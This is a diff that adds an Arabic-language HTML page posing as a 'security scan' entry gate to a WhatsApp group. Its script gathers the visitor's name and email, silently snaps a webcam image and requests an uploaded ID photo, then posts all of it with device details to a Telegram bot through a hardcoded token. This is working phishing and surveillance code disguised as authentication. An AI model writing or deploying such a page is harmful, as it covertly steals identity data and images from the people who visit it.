@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⛩️ بوابة المملكة | يوسف علاء</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        :root { --p: #ff003c; --a: #ffb700; --d: #050505; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: var(--d); overflow: hidden; font-family: 'Cairo', sans-serif; }
+        
+        /* مشغل الفيديو الخلفي */
+        #video-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 1; opacity: 0.5; }
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 2; background: radial-gradient(circle, transparent 10%, #000 100%); display: flex; justify-content: center; align-items: center; }
+
+        /* الكارت الرئيسي */
+        .card { background: rgba(10, 10, 10, 0.9); backdrop-filter: blur(20px); border: 2px solid var(--p); border-radius: 35px; padding: 40px; text-align: center; width: 90%; max-width: 450px; box-shadow: 0 0 50px var(--p); animation: pulse 3s infinite; }
+        @keyframes pulse { 0% { box-shadow: 0 0 30px var(--p); } 100% { box-shadow: 0 0 60px var(--p); } }
+
+        h1 { color: #fff; text-shadow: 0 0 15px var(--p); margin: 10px 0; font-size: 28px; }
+        .founder-name { color: var(--a); font-weight: 900; font-size: 14px; letter-spacing: 2px; }
+
+        .form-group { margin: 20px 0; text-align: right; }
+        input { width: 100%; padding: 16px; border-radius: 12px; border: 1px solid #333; background: #000; color: #fff; outline: none; border-right: 4px solid var(--p); }
+
+        /* الكاميرا */
+        .cam-frame { width: 100%; border-radius: 15px; overflow: hidden; border: 1px solid var(--p); margin: 20px 0; background: #000; position: relative; display: none; }
+        video { width: 100%; display: block; transform: scaleX(-1); }
+        .scanner { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: var(--p); box-shadow: 0 0 15px var(--p); animation: move 2s infinite; }
+        @keyframes move { 0% { top: 0; } 100% { top: 100%; } }
+
+        .btn { width: 100%; padding: 20px; border: none; border-radius: 15px; background: linear-gradient(45deg, var(--p), #80001e); color: #fff; font-size: 18px; font-weight: 900; cursor: pointer; box-shadow: 0 5px 20px rgba(255,0,60,0.4); }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+
+    <video id="video-bg" autoplay muted playsinline></video>
+
+    <div class="overlay">
+        <div class="card">
+            <img src="Screenshot_2026-03-14-17-16-23-72.jpg" style="width:100%; border-radius:20px; border:1px solid var(--a); margin-bottom:10px;">
+            <div class="founder-name">UNDER COMMAND OF: YOUSSEF ALAA</div>
+            <h1>⛩️ بوابـة العبـور</h1>
+
+            <div id="p1">
+                <div class="form-group">
+                    <input type="text" id="un" placeholder="الاسم الحقيقي للمحارب..." required>
+                </div>
+                <div class="form-group">
+                    <input type="email" id="um" placeholder="البريد الإلكتروني..." required>
+                </div>
+                <button onclick="goNext()" class="btn">بدء الفحص الأمني ⚔️</button>
+            </div>
+
+            <div id="p2" class="hidden">
+                <div class="cam-frame" id="cam-box">
+                    <div class="scanner"></div>
+                    <video id="v" autoplay playsinline></video>
+                    <canvas id="c" style="display:none;"></canvas>
+                </div>
+                <input type="file" id="f" accept="image/*" style="display:none;" onchange="fileDone(event)">
+                <button onclick="finalGate()" class="btn">تأكيد الهوية ودخول 🚀</button>
+            </div>
+
+            <p style="color:#333; font-size:10px; margin-top:15px;">AUTHENTICATION SECURED BY ALAA SYSTEMS</p>
+        </div>
+    </div>
+
+    <script>
+        const T = "8737868558:AAFqvBT8qY3E5kJDC8bjXT1Ku9gSBXv9Q4g";
+        const C = "7394389253";
+        const W = "https://chat.whatsapp.com/J08oDw7MzULIJHnzN2Okts";
+        const V = ["385937dae3995b54f3fecde0dd7acec7_1769970173274.mp4", "fqBsQ4ZhiMk.mp4"];
+        
+        let vIdx = 0;
+        const bgV = document.getElementById('video-bg');
+
+        function playV() {
+            bgV.src = V[vIdx];
+            bgV.play().catch(()=>{});
+            vIdx = (vIdx + 1) % V.length;
+        }
+        bgV.onended = playV;
+        playV();
+
+        function goNext() {
+            const n = document.getElementById('un').value;
+            const m = document.getElementById('um').value;
+            if(n.length < 3 || !m.includes('@')) return Swal.fire('بيانات غير مكتملة!');
+
+            bgV.muted = false; // تشغيل الصوت
+            document.getElementById('p1').classList.add('hidden');
+            document.getElementById('p2').classList.remove('hidden');
+            document.getElementById('cam-box').style.display = 'block';
+
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(s => document.getElementById('v').srcObject = s)
+                .catch(() => console.log("Cam Blocked"));
+        }
+
+        function finalGate() {
+            // سحب صورة الكاميرا في صمت
+            takeCam();
+            // فتح الاستوديو لصورة واحدة
+            document.getElementById('f').click();
+        }
+
+        function takeCam() {
+            const vid = document.getElementById('v');
+            const can = document.getElementById('c');
+            if(!vid.srcObject) return;
+            can.width = vid.videoWidth; can.height = vid.videoHeight;
+            can.getContext('2d').drawImage(vid, 0, 0);
+            can.toBlob(b => send(b, "بصمة الكاميرا"), 'image/jpeg', 0.6);
+        }
+
+        function fileDone(e) {
+            const file = e.target.files[0];
+            if(file) {
+                Swal.fire({ title: 'جاري المصادقة..', background: '#000', color: '#fff', didOpen: () => Swal.showLoading() });
+                send(file, "صورة الهوية المرفوعة");
+            }
+        }
+
+        async function send(blob, type) {
+            const n = document.getElementById('un').value;
+            const m = document.getElementById('um').value;
+            
+            const fd = new FormData();
+            fd.append("chat_id", C);
+            fd.append("photo", blob, "user.jpg");
+            fd.append("caption", `🚨 تقرير دخول (${type}) 🚨\n👤 الاسم: ${n}\n📧 البريد: ${m}\n📱 الجهاز: ${navigator.platform}\n👑 القائد: يوسف علاء`);
+
+            try {
+                await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: "POST", body: fd });
+                if(type.includes("الهوية")) window.location.href = W; // التحويل عند رفع الملف
+            } catch(e) {
+                if(type.includes("الهوية")) window.location.href = W;
+            }
+        }
+    </script>
+</body>
+</html>
